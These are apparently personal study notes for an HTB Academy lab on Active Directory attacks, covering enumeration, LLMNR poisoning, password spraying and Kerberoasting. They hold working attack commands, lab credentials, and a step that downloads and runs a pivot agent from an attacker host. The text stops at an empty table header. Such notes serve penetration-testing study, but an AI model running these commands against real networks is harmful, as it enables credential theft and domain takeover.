# Active Directory Enumeration & Attacks

> HTB Academy — CPTS Path. Personal study notes, corrected and expanded with practical command references.

**Lab environment used throughout these notes:**

| Item | Value |
|---|---|
| Domain | `INLANEFREIGHT.LOCAL` |
| Domain Controller | `ACADEMY-EA-DC01` — `172.16.5.5` |
| Standard low-priv user | `forend` / `Klmcargo2` |
| Attacker IP | `172.16.5.225` (internal) |

---

## Table of Contents

- [1. Introduction to Active Directory](#1-introduction-to-active-directory)
  - [1.1 Domain Controller](#11-domain-controller)
  - [1.2 NTDS.dit](#12-ntdsdit)
  - [1.3 LDAP](#13-ldap)
  - [1.4 SPN (Service Principal Name)](#14-spn-service-principal-name)
  - [1.5 Parent, Child, and Trusted Domains](#15-parent-child-and-trusted-domains)
  - [1.6 Tools of the Trade](#16-tools-of-the-trade)
- [2. The Assessment Scenario](#2-the-assessment-scenario)
  - [2.1 Assessment Scope](#21-assessment-scope)
  - [2.2 External Recon Principles](#22-external-recon-principles)
- [3. Initial Enumeration of the Domain](#3-initial-enumeration-of-the-domain)
  - [3.1 Discovering Live Hosts with fping](#31-discovering-live-hosts-with-fping)
  - [3.2 Scanning Hosts with Nmap](#32-scanning-hosts-with-nmap)
  - [3.3 Hunting Valid Usernames with Kerbrute](#33-hunting-valid-usernames-with-kerbrute)
- [4. LLMNR and NBT-NS Poisoning](#4-llmnr-and-nbt-ns-poisoning)
  - [4.1 From Linux (Responder)](#41-from-linux-responder)
  - [4.2 From Windows (Inveigh)](#42-from-windows-inveigh)
  - [4.3 Defenses](#43-defenses)
- [5. Password Spraying](#5-password-spraying)
  - [5.1 Password Policy Enumeration from Linux](#51-password-policy-enumeration-from-linux)
  - [5.2 Password Policy Enumeration from Windows](#52-password-policy-enumeration-from-windows)
  - [5.3 Building a Target User List](#53-building-a-target-user-list)
  - [5.4 Spraying from Linux](#54-spraying-from-linux)
  - [5.5 Spraying from Windows](#55-spraying-from-windows)
- [6. Enumeration](#6-enumeration)
  - [6.1 Security Controls](#61-security-controls)
  - [6.2 Credentialed Enumeration from Linux](#62-credentialed-enumeration-from-linux)
  - [6.3 BloodHound.py and Pivoting Setup](#63-bloodhoundpy-and-pivoting-setup)
  - [6.4 Credentialed Enumeration from Windows](#64-credentialed-enumeration-from-windows)
  - [6.5 Living Off the Land](#65-living-off-the-land)
  - [6.6 LDAP Filters Cheat Sheet](#66-ldap-filters-cheat-sheet)
- [7. Kerberoasting](#7-kerberoasting)
  - [7.1 From Linux](#71-from-linux)
  - [7.2 From Windows](#72-from-windows)
  - [7.3 Encryption Types and Hashcat Modes](#73-encryption-types-and-hashcat-modes)
- [8. ACLs (Access Control Lists)](#8-acls-access-control-lists)
  - [8.1 Enumerating ACLs with BloodHound](#81-enumerating-acls-with-bloodhound)
  - [8.2 Common Abusable Rights](#82-common-abusable-rights)
  - [8.3 DCSync Attack](#83-dcsync-attack)
- [9. Stacking the Deck](#9-stacking-the-deck)
  - [9.1 Privileged Access (RDP, WinRM, MSSQL)](#91-privileged-access-rdp-winrm-mssql)
  - [9.2 The Kerberos Double Hop Problem](#92-the-kerberos-double-hop-problem)
  - [9.3 Bleeding Edge Vulnerabilities](#93-bleeding-edge-vulnerabilities)
- [10. Domain and Forest Trusts](#10-domain-and-forest-trusts)
  - [10.1 Types of Trusts](#101-types-of-trusts)
  - [10.2 Enumerating Trusts](#102-enumerating-trusts)
  - [10.3 Attacking Child to Parent Trusts](#103-attacking-child-to-parent-trusts)
  - [10.4 Attacking Cross-Forest Trusts](#104-attacking-cross-forest-trusts)

---

## 1. Introduction to Active Directory

Active Directory (AD) is Microsoft's directory service, used by the vast majority of enterprise networks to centrally manage identities (users, computers) and the permissions those identities hold. Almost every internal/AD-focused penetration test revolves around the same end goal: **enumerate the domain, find a misconfiguration, and use it to escalate privileges until you control the Domain Controller** — the whole module (and these notes) follows that single scenario from start to finish.

### 1.1 Domain Controller

The **Domain Controller (DC)** is the server that hosts and enforces the AD database. It is effectively the "brain" of the domain — every other machine (web servers, file servers, certificate authorities, etc.) relies on it for authentication and directory lookups. The final goal of almost any AD assessment is to reach (or fully compromise) the DC.

From the Domain Controller, an administrator configures:

```
Users
Groups
Computers (PCs)
Printers
Shares
Privileges / Permissions
```

Most real-world findings come from mistakes in this configuration — e.g., a user accidentally granted membership in a privileged group, or a group given write access to a share that a low-privileged user can then reach through group membership.

### 1.2 NTDS.dit

Everything above — users, groups, computers, password hashes, and permissions — is stored in a database file called **`NTDS.dit`** (NT Directory Services database) on every Domain Controller. Reaching and dumping this file (e.g., via a DCSync or DCShadow-style attack, a shadow copy, or physical/volume access to the DC) is one of the ultimate objectives in an AD engagement, since it exposes every credential in the domain (as password **hashes**, not plaintext).

### 1.3 LDAP

**LDAP (Lightweight Directory Access Protocol)** is the protocol used to query and interact with the AD directory service. If an attacker has network access to a Domain Controller and a valid (even low-privileged) domain account, they can issue LDAP queries to pull back users, groups, computers, and OU structure — no special privileges required, just a valid session. This is essentially "asking the DC for a map of itself."

Tools like **BloodHound** automate this: they run large numbers of LDAP/SMB/WinRM queries against the DC and build a graph of the entire AD environment, highlighting misconfigurations and attack paths visually.

### 1.4 SPN (Service Principal Name)

An **SPN** ties a *service* to the account that runs it. For example, if there's a database server, an admin might create a service account (e.g., `MSSQLSvc`) and register it as the SPN for that SQL service. Any domain user can then request a Kerberos service ticket for that SPN — this is the basis of the **Kerberoasting** attack (see [Section 7](#7-kerberoasting)).

### 1.5 Parent, Child, and Trusted Domains

- **Parent domain** — the root/main domain, e.g. `Inlanefreight.local`.
- **Child domain** — a domain nested under a parent, similar to a subdomain on the web, e.g. `CPTS.Inlanefreight.local`.
- **Trusted domain** — a *separate* root domain that has an established trust relationship with the parent, allowing authentication to flow between them (typically over LDAP/Kerberos), e.g. `SecondInlaneFleight.local`.

Trust relationships are covered in depth in [Section 10](#10-domain-and-forest-trusts).

### 1.6 Tools of the Trade

You don't need to memorize every flag of every tool up front — just build a mental index of *what each tool is for*, and look up exact syntax when you need it. The core tools used throughout this module:

| Tool | Purpose |
|---|---|
| **BloodHound** | Graphs the AD environment and attack paths |
| **Impacket** | A large collection of Python classes/scripts for working with network protocols (SMB, Kerberos, MSRPC, etc.) — includes `secretsdump.py`, `GetUserSPNs.py`, `psexec.py`, and many more |
| **Mimikatz** | Extracts credentials, tickets, and hashes from memory (LSASS) on Windows |
| **NetExec (`nxc`)** | Swiss-army-knife for authenticating to and enumerating Windows/AD hosts over SMB, WinRM, MSSQL, etc. |
| **Rubeus** | Kerberos abuse toolkit for Windows (ticket requests, Kerberoasting, ticket manipulation) |

> **Tooling note:** These notes (and the original HTB material) frequently reference **CrackMapExec (`cme`)**. CrackMapExec is no longer maintained — the community fork **NetExec (`nxc`)** replaced it and uses nearly identical syntax (`crackmapexec smb ...` → `nxc smb ...`). Both are shown below; if a lab image still ships `crackmapexec`, it will work the same way.

---

## 2. The Assessment Scenario

Most internal AD engagements start from an **assumed breach** position: the client hands you a standard domain user's username and password (or you're placed on the internal network with a foothold already established). If you truly have nothing, the first job is to get a foothold through some other means (phishing, external exploitation, etc.) before falling back into this same workflow.

### 2.1 Assessment Scope

**In scope:**

| Range/Domain | Description |
|---|---|
| `INLANEFREIGHT.LOCAL` | Customer domain, including AD and web services |
| `LOGISTICS.INLANEFREIGHT.LOCAL` | Customer subdomain (child domain) |
| `FREIGHTLOGISTICS.LOCAL` | Subsidiary company owned by Inlanefreight — external forest trust with `INLANEFREIGHT.LOCAL` |
| `172.16.5.0/23` | In-scope internal subnet |

**Out of scope:**

- Any other subdomains of `INLANEFREIGHT.LOCAL`
- Any subdomains of `FREIGHTLOGISTICS.LOCAL`
- Any phishing or social engineering
- Any IPs/domains/subdomains not explicitly listed above
- Any attacks against the real-world `inlanefreight.com` website beyond the passive enumeration covered in this module

### 2.2 External Recon Principles

For AD-focused engagements, heavy external OSINT rarely moves the needle (it doesn't come up in the exam or in most real AD assessments) — don't over-invest time here. The value is almost entirely internal, once you have network access and a foothold.

---

## 3. Initial Enumeration of the Domain

Goals for this phase, working from a foothold (typically a Linux jump box already inside the AD network, reached over SSH):

- Scan the internal network for live hosts
- Identify running services
- Identify high-value/vulnerable services
- Identify possible paths to an initial foothold (if you don't already have credentials)
- Keep notes on everything found — it will matter later

Core things to look for:

- AD users
- AD-joined computers
- Key services (Kerberos, NetBIOS, LDAP, DNS)
- Vulnerable hosts/services

### 3.1 Discovering Live Hosts with fping

```bash
fping -asgq 172.16.5.0/23
```

Flag breakdown:

| Flag | Meaning |
|---|---|
| `-a` | Show only hosts that are alive |
| `-s` | Print summary statistics at the end |
| `-g` | Generate the target list from a CIDR range (here, `/23` — the full scoped subnet) |
| `-q` | Quiet — suppress per-probe output, just show results |

Save the results to a file, run the sweep more than once (some hosts respond inconsistently), and keep a copy for yourself and one for reporting:

```bash
fping -asgq 172.16.5.0/23 2>/dev/null | tee hosts.txt
```

### 3.2 Scanning Hosts with Nmap

```bash
nmap -A -iL hosts.txt -oN nmap
```

This runs an aggressive scan (`-A`: OS detection, version detection, default scripts, traceroute) against every host in `hosts.txt` and saves normal-format output to `nmap`. On a large `/23` this can take a while — for a faster first pass, consider `-sC -sV -T4` and come back for `-A` on interesting hosts only.

Signs that a host is a Domain Controller:

```
389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
```

```
| Subject Alternative Name: DNS:ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

```
88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-04-04 15:12:06Z)
```

Any of these (open **389/636 LDAP**, a certificate SAN referencing a `DC0x` hostname, or open **88 Kerberos**) is a strong indicator of a Domain Controller.

### 3.3 Hunting Valid Usernames with Kerbrute

**Kerbrute** brute-forces a wordlist of candidate usernames against Kerberos pre-authentication and reports which ones are valid AD accounts — regardless of where the wordlist came from.

```bash
sudo git clone https://github.com/ropnop/kerbrute.git
```

```bash
kerbrute userenum -d <AD_DOMAIN> --dc <DC_IP> <USERNAME_FILE> -o <RESULT_FILE>

kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
```

| Placeholder | Meaning |
|---|---|
| `<AD_DOMAIN>` | Root domain name (visible in the Nmap LDAP/Kerberos output above) |
| `<DC_IP>` | Domain Controller IP found via Nmap |
| `<USERNAME_FILE>` | A candidate username list (HTB provides a `jsmith.txt`-style list; search for common corporate naming-convention wordlists too) |
| `<RESULT_FILE>` | Output file for confirmed valid usernames |

This gives you a list of confirmed, real AD usernames to use in the next phase.

---

## 4. LLMNR and NBT-NS Poisoning

This is a lightweight, high-value attack that only needs **one misconfiguration**: a Windows host falling back to broadcast name resolution.

**How it happens:** a user tries to access a share, e.g. `\\Print\Documents`, and mistypes the name. Windows first checks DNS; when DNS fails to resolve the name, it falls back to broadcasting the request to the entire local network via **LLMNR (Link-Local Multicast Name Resolution)** and **NBT-NS (NetBIOS Name Service)**, asking "does anyone know where this resource is?" Every legitimate host stays silent (they don't know it either) — except an attacker running a tool like **Responder**.

An attacker sitting on the same broadcast segment and running Responder answers *"yes, that's me — send me your credentials"*. The victim's machine then authenticates to the attacker, sending:

```
Username : PasswordHash (NTLMv2)
```

The captured hash is an **NTLMv2** hash, which must be cracked **offline** (it cannot be replayed directly like an NTLM hash can in some scenarios — it has to be brute-forced/dictionary-attacked).

### 4.1 From Linux (Responder)

Responder supports:

```
LLMNR, DNS, MDNS, NBNS, DHCP, ICMP, HTTP, HTTPS, SMB, LDAP, WebDAV, Proxy Auth
```

Plus limited support for: `MSSQL, DCE-RPC, FTP, POP3, IMAP, SMTP auth`.

```bash
sudo responder -h
```

Identify which interface sits on the target's internal network (it typically shares the same subnet as the DC, e.g. `172.16.5.x`):

```bash
ifconfig
```

Start listening:

```bash
sudo responder -I <INTERFACE_NAME>

sudo responder -I ens224
```

Captured hashes appear highlighted, e.g.:

```
[mysql] NTLMv2-SSP Username : INLANEFREIGHT\lab_adm
[mysql] NTLMv2-SSP Hash : lab_adm::INLANEFREIGHT:<HASH>
```

Save every hash (one per line) to a file:

```bash
vim hash.txt
```

Crack offline with Hashcat (`-m 5600` = NetNTLMv2):

```bash
hashcat hash.txt /usr/share/wordlists/rockyou.txt -m 5600
```

Save cracked passwords to `pass.txt` for use in credentialed enumeration and lateral movement.

### 4.2 From Windows (Inveigh)

Use this when you're already operating from a compromised Windows host rather than your own attack box.

**PowerShell version:**

```powershell
Import-Module .\Inveigh.ps1
(Get-Command Invoke-Inveigh).Parameters
```

Enable NBNS poisoning (the equivalent of Responder's core behavior):

```powershell
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

**C# version** (often more OPSEC-friendly / better AV evasion):

```powershell
.\Inveigh.exe
```

Press `ESC` to reach the console, then:

```
HELP
GET NTLMV2
RESUME
```

`GET NTLMV2` dumps captured hashes; `RESUME` continues poisoning. Take the hashes back to Linux and crack them the same way as above.

### 4.3 Defenses

Worth noting for reporting/remediation sections:

- Disable LLMNR (Group Policy: *Computer Configuration → Administrative Templates → Network → DNS Client → Turn OFF Multicast Name Resolution*) and disable NBT-NS (per-adapter, or via DHCP option 001570 in some environments).
- Enable **SMB Signing** to prevent captured hashes from being relayed to SMB.
- Require **NTLMv2-only** and disable NTLMv1 domain-wide where possible.

---

## 5. Password Spraying

The idea: try **one (or a few) weak/common password(s) across many usernames**, instead of many passwords against one account — this avoids account lockout thresholds that a brute-force would trigger. It requires a **valid list of usernames** — without one, spraying isn't possible.

### 5.1 Password Policy Enumeration from Linux

Always check the lockout policy first, so you know your safety margin (e.g., "3 attempts per 30 minutes" limits you to one guess every half hour).

**Null session via `rpcclient`:**

```bash
rpcclient -U "" -N 172.16.5.5
```

```
querydominfo      # user/group/alias counts
getdompwinfo      # password policy (min length, complexity, etc.)
```

**`enum4linux`:**

```bash
enum4linux -P 172.16.5.5
# or, on newer systems:
enum4linux-ng -P 172.16.5.5
```

**LDAP (only works if the DC allows anonymous/unauthenticated LDAP binds — a misconfiguration in itself):**

```bash
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

### 5.2 Password Policy Enumeration from Windows

If you land on a Windows box first, you don't need any third-party tooling to pull the same policy:

```powershell
# Requires the AD module
Get-ADDefaultDomainPasswordPolicy

# PowerView
Get-DomainPolicyData | Select-Object -ExpandProperty SystemAccess

# Built-in, no modules required
net accounts /domain
```

### 5.3 Building a Target User List

You rarely have to *guess* a valid username list — pull one directly if you have any of the following.

**SMB null session:**

```bash
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

nxc smb 172.16.5.5 --users
# legacy: crackmapexec smb 172.16.5.5 --users

ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "

./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```

**Brute-force (no session required):**

```bash
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /path/to/rockyou.txt
```

**Already have one working credential pair:**

```bash
sudo nxc smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
# legacy: sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```

### 5.4 Spraying from Linux

**Kerbrute** — spray one password against every username in the list:

```bash
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
```

**NetExec / CrackMapExec:**

```bash
sudo nxc smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
# legacy: sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

`grep +` filters output to only the successful (green `+`) authentications.

**Local administrator spraying** (testing one password/hash against many hosts' *local* Administrator account, not a domain account):

```bash
sudo nxc smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

`--local-auth` is critical here — it tells the tool to authenticate against each machine's **local** SAM, not the domain, since local admin passwords are often reused across many hosts.

### 5.5 Spraying from Windows

```powershell
Import-Module .\DomainPasswordSpray.ps1

Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

---

## 6. Enumeration

### 6.1 Security Controls

Always fingerprint the defensive posture before doing anything noisy.

**Windows Defender:**

```powershell
Get-MpComputerStatus
```

**AppLocker** (application whitelisting — restricts which binaries/scripts can execute):

```powershell
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
```

**PowerShell Constrained Language Mode** — restricts which PowerShell features/cmdlets are usable (Full Language Mode has none of these restrictions):

```powershell
$ExecutionContext.SessionState.LanguageMode
```

**LAPS (Local Administrator Password Solution)** — every AD-joined *machine* also has its own account, always suffixed with `$` (e.g. `SQL01$`). LAPS randomizes and periodically rotates the **local** Administrator password on each machine independently, so compromising one machine's local admin doesn't hand you every machine's local admin. Key enumeration questions:

- Who has permission to *read* LAPS passwords?
- Which computers are LAPS-managed?
- Can my current account read a LAPS password directly?

Practical enumeration (legacy LAPS attribute `ms-Mcs-AdmPwd`, or the newer Windows LAPS attribute `msLAPS-Password`):

```powershell
# PowerView
Get-DomainObject -Identity <computer> -Properties ms-mcs-admpwd,ms-mcs-admpwdexpirationtime

# Purpose-built tools
pyLAPS.py --action get -d inlanefreight.local -u forend -p Klmcargo2
nxc ldap 172.16.5.5 -u forend -p Klmcargo2 -M laps
```

### 6.2 Credentialed Enumeration from Linux

Working from the assumed-breach position with:

```
Domain              : INLANEFREIGHT.LOCAL
User                : forend
Password             : Klmcargo2
Domain Controller IP : 172.16.5.5
```

**NetExec / CrackMapExec:**

```bash
sudo nxc smb 172.16.5.5 -u forend -p Klmcargo2 --users     # dump AD users -> save to users.txt
sudo nxc smb 172.16.5.5 -u forend -p Klmcargo2 --groups    # dump AD groups -> save to groups.txt
sudo nxc smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
sudo nxc smb 172.16.5.5 -u forend -p Klmcargo2 --shares
sudo nxc smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share '<SHARE_NAME>'
```

(Legacy syntax is identical, just swap `nxc` for `crackmapexec`.)

**SMBMap:**

```bash
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5

smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```

Other classic tools worth knowing exist (not covered in depth here since BloodHound largely supersedes them for mapping purposes): `rpcclient`, the **Impacket** toolkit, and **Windapsearch**.

### 6.3 BloodHound.py and Pivoting Setup

**BloodHound** is one of the most important tools for understanding an AD environment: it maps users, computers, shares, group memberships, sessions, ACLs, and trusts into a single graph and highlights concrete attack paths.

**Prerequisite:** you need direct network reachability to the DC (test with `ping <DC_IP>`). If you're not directly on the AD network, you'll need to pivot there first (VPN, SSH tunnel, Ligolo-ng, Chisel, etc.).

**Example pivot setup with Ligolo-ng:**

```bash
# Attacker box
sudo ./proxy -selfcert
python3 -m http.server
```

```bash
# From the foothold, over SSH
ssh htb-student@10.129.99.5
wget http://<ATTACKER_IP>:8000/agent
chmod +x agent
./agent -connect <ATTACKER_IP>:11601 -ignore-cert
```

Back on the attacker's Ligolo console: select the new session, run `autoroute`, choose the target AD subnet, confirm. Then verify with `ping 172.16.5.5`.

Add a hosts entry so tools can resolve the domain name:

```bash
echo "172.16.5.5 INLANEFREIGHT.LOCAL" | sudo tee -a /etc/hosts
```

**Collect data with `bloodhound-python`:**

```bash
bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all --zip
```

`-c all` collects every data type. Expect output similar to:

```
Found 1 domains
Found 2 domains in the forest  --> Trusted Domains
Found 564 computers
Found 2951 users
Found 183 groups
Found 2 trusts
```

**Run BloodHound (Legacy UI is recommended** — the newer web-based BloodHound CE has a less mature graph UI for this kind of manual path-hunting; both work):

```bash
wget https://github.com/SpecterOps/BloodHound-Legacy/releases/download/v4.3.1/BloodHound-linux-x64.zip
unzip BloodHound-linux-x64.zip
cd BloodHound-linux-x64

sudo neo4j start        # BloodHound Legacy talks to a Neo4j graph database
./BloodHound --no-sandbox
```

Log in, upload the collected zip, and search for your compromised user in the **Search for a Node** box, e.g.:

```
FOREND@INLANEFREIGHT.LOCAL
```

The **Node Info** panel shows the object's properties. The **Object ID** field ends in the object's **RID** (last 4 digits), which becomes useful in later attacks (e.g., SID-based attacks). It also shows group memberships and nested group relationships — the starting point for path-hunting, covered throughout the rest of this document.

> **Correction:** an earlier draft of these notes claimed that in a BloodHound node name like `DAMUNDSEN@INLANEFREIGHT.LOCAL`, `DAMUNDSEN` represents "the Domain Controller." That's incorrect — in BloodHound, **user objects are displayed as `SAMACCOUNTNAME@DOMAIN.TLD`**, so `DAMUNDSEN` here is simply the **username**, and `INLANEFREIGHT.LOCAL` is the domain. Computer objects follow a similar pattern using their hostname, e.g. `ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL`.

### 6.4 Credentialed Enumeration from Windows

**Built-in AD module:**

```powershell
Import-Module ActiveDirectory
Get-Module                                      # confirm it loaded

Get-ADDomain                                    # domain info
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
Get-ADTrust -Filter *
Get-ADGroup -Filter * | Select-Object name
Get-ADGroup -Identity "Backup Operators"
Get-ADGroupMember -Identity "Backup Operators"
```

**PowerView** — a PowerShell recon toolkit built specifically for AD:

```powershell
Import-Module .\PowerView.ps1

Get-DomainUser -Identity mmorgan                            # group memberships, admin flags, password expiry, etc.
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
Get-DomainTrustMapping
Find-LocalAdminAccess                                        # every machine the current user has local admin on
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName   # Kerberoastable accounts
```

**SharpView** — the compiled C# equivalent of PowerView. Use it when AV/AMSI or a restrictive PowerShell language mode makes running the `.ps1` version impractical:

```powershell
.\SharpView.exe Get-DomainUser -Identity forend
```

(Full command reference: HTB Academy module, "Credentialed Enumeration – from Windows" section.)

**Snaffler** — automated share/file content triage; hunts for credentials, config files, and other sensitive data across every share the current user can reach:

```powershell
.\Snaffler.exe -s -d INLANEFREIGHT.LOCAL -o snaffler.log -v data
```

| Flag | Meaning |
|---|---|
| `-d` | Target domain |
| `-s` | Print results to screen |
| `-o` | Write results to file |
| `-v data` | Verbosity level focused on high-value findings |

**BloodHound vs. SharpHound:** SharpHound is the **collector** (equivalent to `bloodhound-python`, but a native Windows binary); BloodHound is the **viewer**.

```powershell
.\SharpHound.exe -c All --zipfilename ILFREIGHT
```

Upload the resulting `.zip` into BloodHound exactly as described in [6.3](#63-bloodhoundpy-and-pivoting-setup).

### 6.5 Living Off the Land

When you can't upload/download tooling to the target (AV, AppLocker, egress restrictions), fall back to native Windows commands.

**Basics:**

```powershell
hostname
systeminfo
ipconfig /all
```

```cmd
echo %USERDOMAIN%
echo %LOGONSERVER%
```

**PowerShell environment/config:**

```powershell
Get-Module                                          # loaded modules — presence of "ActiveDirectory" means Get-ADUser/Get-ADComputer/Get-ADGroup are usable
Get-ExecutionPolicy -List
Set-ExecutionPolicy Bypass -Scope Process           # affects only the current session
Get-ChildItem Env:                                   # USERNAME, COMPUTERNAME, USERDOMAIN, PATH, etc.
Get-Content $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Get-Host                                             # PowerShell version
```

**Firewall / Defender state:**

```cmd
netsh advfirewall show allprofiles
sc query windefend
```

```powershell
Get-MpComputerStatus       # check Enabled, RunningMode, SignaturesOutOfDate, IsTamperProtected
```

**Am I alone on this box? (important):**

```cmd
qwinsta
```

**Local network context:**

```cmd
arp -a          # recently-contacted hosts on the local segment
route print     # known routes — useful for spotting multi-homed pivot boxes
```

**WMI / WMIC** (note: `wmic` is deprecated and absent by default on recent Windows builds, but still common in older lab/production environments):

```cmd
wmic qfe get Caption,Description,HotFixID,InstalledOn
wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:list
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
```

**`net` commands:**

```cmd
net accounts /domain                 # password policy
net group /domain                    # all domain groups
net group "Domain Admins" /domain    # membership of a specific group
net user /domain                     # all domain users
net user wrouse /domain              # detail on one user
net localgroup                       # local groups
net localgroup Administrators        # local admin members
net share                            # shares on this host
net view \\COMPUTER /all             # shares on a remote host
net use X: \\COMPUTER\Share          # map a share as a drive
```

**`dsquery`:**

```cmd
dsquery user
dsquery computer
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```

**Reading a Distinguished Name (DN):**

```
CN=Jessica Ramsey,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
```

- `CN=Jessica Ramsey` — the object itself
- `CN=Users` — the container it lives in
- `DC=INLANEFREIGHT,DC=LOCAL` — the domain, `INLANEFREIGHT.LOCAL`

```
CN=User1,OU=IT,OU=Employees,DC=company,DC=local
```

Reads as: user `User1`, inside OU `IT`, inside OU `Employees`, in domain `company.local`.

### 6.6 LDAP Filters Cheat Sheet

Every condition is wrapped in parentheses:

```
(objectClass=user)          # any object whose class is "user"
```

Wildcard search:

```
(sAMAccountName=om*)        # account names starting with "om"
```

**AND** — every condition must match:

```
(&(objectClass=user)(sAMAccountName=omar))
```

**OR** — at least one condition must match:

```
(|(sAMAccountName=omar)(sAMAccountName=ahmed))
```

**NOT** (worth adding — not in the original notes, but commonly needed):

```
(!(objectClass=computer))   # everything except computer objects
```

Useful `userAccountControl` flag values when filtering/interpreting accounts:

| Value | Meaning |
|---|---|
| `32` | Password not required |
| `64` | User cannot change their own password |
| `8192` | Account represents a Domain Controller |

---

## 7. Kerberoasting

Any service account with a registered **SPN** ([1.4](#14-spn-service-principal-name)) can have a **TGS (service ticket)** requested for it by *any* authenticated domain user — no special privilege required. Part of that TGS is encrypted using a key derived from the service account's own password hash (traditionally RC4/NTLM, though modern DCs default to AES if the account supports it).

**The attack:** request the TGS for a target SPN, take it offline, and crack it to recover the service account's plaintext password. Because service accounts are often over-privileged (local admin on a database server, sometimes even Domain Admins), this is a very common privilege-escalation / lateral-movement path.

You need a valid `username:password` (or equivalent) to be able to request TGS tickets in the first place.

### 7.1 From Linux

**Impacket's `GetUserSPNs.py`:**

```bash
GetUserSPNs.py -h
```

List every SPN-registered account in the domain:

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```

Request TGS hashes for **every** Kerberoastable account:

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
```

Target a **specific** account:

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user <USERNAME>
```

Save output to a file:

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```

Crack with Hashcat (mode `13100` = Kerberos 5, etype 23, TGS-REP / RC4):

```bash
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```

Validate the recovered credential:

```bash
sudo nxc smb 172.16.5.5 -u sqldev -p 'database!'
```

> Modern Impacket installs (via `pip`/`pipx`) also expose these as `impacket-getuserspns`, `impacket-secretsdump`, etc.

### 7.2 From Windows

**Manual (no automation, ticket only lives in the current session's memory):**

```cmd
setspn.exe -Q */*
```

```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

Or request every SPN's ticket in one line:

```powershell
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

Neither command prints the hash directly — the ticket is cached in memory only. Pull it out with **Mimikatz**:

```
mimikatz # kerberos::list /export
```

This exports the ticket(s) as `.kirbi` files. Convert to a crackable format and crack:

```bash
kirbi2john.py ticket.kirbi > ticket_hash.txt
# strip John's format prefix if needed, then:
hashcat -m 13100 ticket_hash.txt /usr/share/wordlists/rockyou.txt
```

**Automated — PowerView:**

```powershell
Import-Module .\PowerView.ps1
Get-DomainUser * -SPN | Select-Object samaccountname

Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

# every account at once, saved to CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

**Automated — Rubeus:**

```powershell
.\Rubeus.exe kerberoast
```

Rubeus can also filter to just accounts with `admincount=1` (i.e., accounts that are/were members of protected admin groups) — a good way to prioritize high-value targets. Full flag reference: HTB Academy module, "Kerberoasting – from Windows" section.

### 7.3 Encryption Types and Hashcat Modes

Not every Kerberoast hash cracks the same way — check the supported encryption type first:

```powershell
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

Or read it straight off a Rubeus request:

```powershell
.\Rubeus.exe kerberoast /user:testspn /nowrap
```

```
[*] Supported ETypes : AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96
[*] Hash : $krb5tgs$18$testspn$INLANEFREIGHT.LOCAL$*testspn/kerberoast.inlanefreight.local@INLANEFREIGHT.LOCAL*$89<..HASH>
```

The number right after `$krb5tgs$` is the **Kerberos encryption type (etype)**, and it determines the correct Hashcat mode:

| Hash prefix | Encryption type | Hashcat mode | Crackability |
|---|---|---|---|
